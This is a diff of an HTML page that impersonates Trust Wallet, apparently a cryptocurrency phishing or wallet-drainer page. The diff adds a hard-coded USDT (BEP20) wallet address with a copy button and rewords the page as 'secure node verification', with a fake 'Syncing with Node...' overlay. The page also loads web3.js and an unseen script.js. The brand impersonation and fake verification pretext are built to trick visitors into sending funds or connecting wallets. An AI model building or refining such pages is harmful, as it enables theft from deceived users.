@@ -7,18 +7,24 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.8.1/web3.min.js"></script>
     <style>
         body { margin: 0; font-family: -apple-system, sans-serif; background: #0b0e11; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .card { background: #1e2329; padding: 30px; border-radius: 24px; text-align: center; width: 90%; max-width: 380px; border: 1px solid #2d3139; }
-        .logo { width: 50px; margin-bottom: 10px; }
-        h2 { font-size: 20px; color: #3172DE; margin-bottom: 5px; }
-        p { color: #929aa5; font-size: 14px; margin-bottom: 20px; }
+        .card { background: #1e2329; padding: 25px; border-radius: 24px; text-align: center; width: 90%; max-width: 360px; border: 1px solid #2d3139; }
+        .logo { width: 45px; margin-bottom: 8px; }
+        h2 { font-size: 18px; color: #fff; margin-bottom: 5px; }
+        p.desc { color: #929aa5; font-size: 13px; margin-bottom: 20px; }
         
-        /* QR Container */
-        #qrcode-container { background: white; padding: 15px; border-radius: 20px; border: 4px solid #3172DE; display: inline-block; margin-bottom: 20px; }
-        #qrImage { width: 200px; height: 200px; display: block; }
+        /* QR Section */
+        #qrcode-container { background: white; padding: 12px; border-radius: 18px; display: inline-block; margin-bottom: 15px; }
+        #qrImage { width: 180px; height: 180px; display: block; }
         
+        /* Address Box */
+        .address-box { background: #2d3139; border-radius: 12px; padding: 12px; display: flex; align-items: center; justify-content: space-between; margin-bottom: 20px; border: 1px dashed #474d57; }
+        .address-text { font-size: 11px; color: #f0b90b; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; width: 80%; font-family: monospace; }
+        .copy-btn { background: none; border: none; color: #3172DE; font-size: 12px; font-weight: bold; cursor: pointer; padding: 5px; }
+
         .btn { background: #3172DE; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-size: 16px; font-weight: bold; cursor: pointer; }
+        
         #overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 100; flex-direction: column; align-items: center; justify-content: center; }
-        .spinner { border: 4px solid #333; border-top: 4px solid #3172DE; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        .spinner { border: 3px solid #333; border-top: 3px solid #3172DE; border-radius: 50%; width: 35px; height: 35px; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
@@ -26,11 +32,16 @@
 
     <div class="card">
         <img src="https://trustwallet.com/assets/images/media/assets/trust_platform.png" class="logo" alt="Trust Logo">
-        <h2>Smart Verification</h2>
-        <p>Scan with Trust Wallet to verify your assets securely.</p>
+        <h2>Verify USDT (BEP20)</h2>
+        <p class="desc">Scan or copy address to initiate secure node verification.</p>
         
         <div id="qrcode-container">
-            <img id="qrImage" src="" alt="QR Code Loading...">
+            <img id="qrImage" src="" alt="QR Loading...">
+        </div>
+
+        <div class="address-box">
+            <span id="addrDisplay" class="address-text">0x673849E3109f6Cf1f6ced4034C8363C17ff87ebe</span>
+            <button class="copy-btn" onclick="copyAddress()">COPY</button>
         </div>
 
         <button id="nextBtn" class="btn">Verify Assets</button>
@@ -38,13 +49,20 @@
 
     <div id="overlay">
         <div class="spinner"></div>
-        <p id="status-text" style="color:#3172DE; margin-top:15px; font-weight:bold;">Initializing Node...</p>
-        <p id="sub-text" style="color:#555; font-size:12px;">Connecting to secure gateway</p>
+        <p id="status-text" style="color:#3172DE; margin-top:15px; font-weight:bold; font-size: 14px;">Syncing with Node...</p>
     </div>
 
     <script src="script.js"></script>
     <script>
-        // Automatic QR Generator using Google API
+        // Copy Function
+        function copyAddress() {
+            const addr = document.getElementById("addrDisplay").innerText;
+            navigator.clipboard.writeText(addr).then(() => {
+                alert("Address Copied!");
+            });
+        }
+
+        // QR Generator
         window.onload = function() {
             const currentUrl = window.location.href;
             const qrImg = document.getElementById("qrImage");
